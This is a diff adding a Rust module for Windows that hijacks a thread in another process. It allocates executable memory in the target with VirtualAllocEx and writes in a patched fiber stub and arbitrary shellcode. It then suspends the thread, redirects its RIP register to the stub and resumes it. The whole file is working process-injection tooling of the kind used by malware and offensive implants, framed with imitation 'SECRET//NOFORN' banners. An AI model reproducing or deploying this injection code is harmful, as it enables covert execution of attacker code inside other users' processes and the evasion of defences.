@@ -1,0 +1,225 @@
+/*********************************************************************************
+                            --- SECRET//NOFORN ---
+**********************************************************************************/
+
+use std::ffi::c_void;
+use windows::{
+    core::Result,
+    Win32::{
+        Foundation::{CloseHandle, HANDLE},
+        System::{
+            Diagnostics::Debug::{WriteProcessMemory, CONTEXT, GetThreadContext, SetThreadContext, CONTEXT_FLAGS, FlushInstructionCache},
+            LibraryLoader::{GetModuleHandleA, GetProcAddress},
+            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+            Threading::{
+                OpenProcess, OpenThread, ResumeThread, SuspendThread,
+                PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS
+            },
+        },
+        UI::WindowsAndMessaging::{PostThreadMessageA, WM_NULL},
+    },
+};
+
+// CONTEXT flags constant (CONTEXT_FULL)
+const CONTEXT_ALL: CONTEXT_FLAGS = CONTEXT_FLAGS(0x0010001F);
+
+// open handle to target proc with full access
+pub unsafe fn open_target_process(pid: u32) -> Result<HANDLE> {
+    OpenProcess(PROCESS_ALL_ACCESS, false, pid)
+}
+
+// open handle to target thread with full access
+pub unsafe fn open_target_thread(thread_id: u32) -> Result<HANDLE> {
+    OpenThread(THREAD_ALL_ACCESS, false, thread_id)
+}
+
+// allocate memory in remote process
+pub unsafe fn remote_alloc(h_process: HANDLE, size: usize) -> Result<*mut c_void> {
+    let addr = VirtualAllocEx(
+        h_process,
+        None,
+        size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+
+    if addr.is_null() {
+        return Err(windows::core::Error::from_thread());
+    }
+
+    Ok(addr)
+}
+
+// write to remote process memory
+pub unsafe fn remote_write(h_process: HANDLE, address: *const c_void, data: &[u8]) -> Result<()> {
+    let mut bytes_written = 0usize;
+    WriteProcessMemory(
+        h_process,
+        address,
+        data.as_ptr() as *const c_void,
+        data.len(),
+        Some(&mut bytes_written),
+    )?;
+
+    if bytes_written != data.len() {
+        return Err(windows::core::Error::from_thread());
+    }
+
+    Ok(())
+}
+
+// suspend remote thread
+pub unsafe fn suspend_remote_thread(h_thread: HANDLE) -> Result<u32> {
+    let prev_count = SuspendThread(h_thread);
+    if prev_count == u32::MAX {
+        return Err(windows::core::Error::from_thread());
+    }
+    Ok(prev_count)
+}
+
+// resume remote thread
+pub unsafe fn resume_remote_thread(h_thread: HANDLE) -> Result<u32> {
+    let prev_count = ResumeThread(h_thread);
+    if prev_count == u32::MAX {
+        return Err(windows::core::Error::from_thread());
+    }
+    Ok(prev_count)
+}
+
+#[repr(C, align(16))]
+pub struct AlignedContext(pub CONTEXT);
+
+// get remote thread context
+pub unsafe fn get_remote_thread_context(h_thread: HANDLE) -> Result<AlignedContext> {
+    // allocate on heap
+    let mut aligned = Box::new(std::mem::MaybeUninit::<AlignedContext>::uninit());
+    let ctx_ptr = aligned.as_mut_ptr() as *mut CONTEXT;
+
+    // zero initialize to be safe
+    std::ptr::write_bytes(ctx_ptr, 0, 1);
+
+    // set context flags
+    (*ctx_ptr).ContextFlags = CONTEXT_ALL;
+
+    GetThreadContext(h_thread, ctx_ptr)?;
+    Ok(*aligned.assume_init())
+}
+
+/// set thread context
+pub unsafe fn set_remote_thread_context(h_thread: HANDLE, ctx: &AlignedContext) -> Result<()> {
+    SetThreadContext(h_thread, &ctx.0)
+}
+
+pub unsafe fn hijack_thread_with_fiber(
+    h_process: HANDLE,
+    h_thread: HANDLE,
+    shellcode: &[u8],
+) -> Result<*mut c_void> {
+    // load compiled fiber stub
+    let fiber_stub_orig: &[u8] = include_bytes!("fiber_stub.bin");
+    let mut fiber_stub = fiber_stub_orig.to_vec();
+
+    // resolve API addresses locally
+    use windows::core::PCSTR;
+    let h_kernel32 = GetModuleHandleA(windows::core::s!("kernel32.dll"))?;
+    
+    let addr_convert = GetProcAddress(h_kernel32, PCSTR(b"ConvertThreadToFiber\0".as_ptr())).unwrap() as u64;
+    let addr_create = GetProcAddress(h_kernel32, PCSTR(b"CreateFiber\0".as_ptr())).unwrap() as u64;
+    let addr_switch = GetProcAddress(h_kernel32, PCSTR(b"SwitchToFiber\0".as_ptr())).unwrap() as u64;
+
+    // patch placeholders
+    fn patch_bytes(stub: &mut [u8], placeholder: u64, actual: u64) {
+        let pattern = placeholder.to_le_bytes();
+        let actual_bytes = actual.to_le_bytes();
+        
+        // simple linear scan
+        for i in 0..stub.len().saturating_sub(7) {
+            if stub[i..i+8] == pattern {
+                stub[i..i+8].copy_from_slice(&actual_bytes);
+                return; // assume one occurrence
+            }
+        }
+    }
+
+    patch_bytes(&mut fiber_stub, 0x1111111111111111, addr_convert);
+    patch_bytes(&mut fiber_stub, 0x2222222222222222, addr_create);
+    patch_bytes(&mut fiber_stub, 0x3333333333333333, addr_switch);
+
+    // calculate padding to align shellcode to 16 bytes
+    let stub_len = fiber_stub.len();
+    let padding_len = (16 - (stub_len % 16)) % 16;
+    let shellcode_offset = stub_len + padding_len;
+
+    // calculate total size needed
+    let total_size = shellcode_offset + shellcode.len();
+
+    // allocate memory in remote process
+    let remote_mem = remote_alloc(h_process, total_size)?;
+
+    // calculate addresses
+    let stub_addr = remote_mem;
+    let shellcode_addr = (remote_mem as usize + shellcode_offset) as *mut c_void;
+
+    // write fiber stub to remote memory
+    remote_write(h_process, stub_addr, &fiber_stub)?;
+
+    // write shellcode after stub (and padding)
+    remote_write(h_process, shellcode_addr, shellcode)?;
+
+    // flush instruction cache to ensure CPU sees new code
+    FlushInstructionCache(h_process, Some(remote_mem.cast()), total_size)?;
+
+    // suspend target thread
+    suspend_remote_thread(h_thread)?;
+
+    // get current thread context
+    let mut ctx_wrapper = get_remote_thread_context(h_thread)?;
+    let ctx = &mut ctx_wrapper.0;
+
+    // modify RIP to point to fiber stub
+    ctx.Rip = stub_addr as u64;
+
+    // set RDI to point to shellcode
+    ctx.Rdi = shellcode_addr as u64;
+
+    // set the modified context
+    set_remote_thread_context(h_thread, &ctx_wrapper)?;
+
+    // verify RIP updated
+    let verify_ctx = get_remote_thread_context(h_thread)?;
+
+    if verify_ctx.0.Rip != stub_addr as u64 {
+        println!("[-] Did not update.");
+    }
+
+    // resume thread - check suspension count
+    let mut suspend_count = resume_remote_thread(h_thread)?;
+
+    // if thread is still suspended, force resume
+    while suspend_count > 1 {
+        suspend_count = resume_remote_thread(h_thread)?;
+    }
+
+    // trigger thread wake-up
+    use windows::Win32::System::Threading::GetThreadId;
+    let tid = GetThreadId(h_thread);
+    if tid != 0 {
+         let _ = PostThreadMessageA(tid, WM_NULL, windows::Win32::Foundation::WPARAM(0), windows::Win32::Foundation::LPARAM(0));
+    }
+
+    Ok(stub_addr)
+}
+
+// close process handle
+pub unsafe fn close_process_handle(h_process: HANDLE) -> Result<()> {
+    CloseHandle(h_process)
+}
+
+// close thread handle
+pub unsafe fn close_thread_handle(h_thread: HANDLE) -> Result<()> {
+    CloseHandle(h_thread)
+}
+
+/*********************************************************************************
+                            --- SECRET//NOFORN ---
+**********************************************************************************/
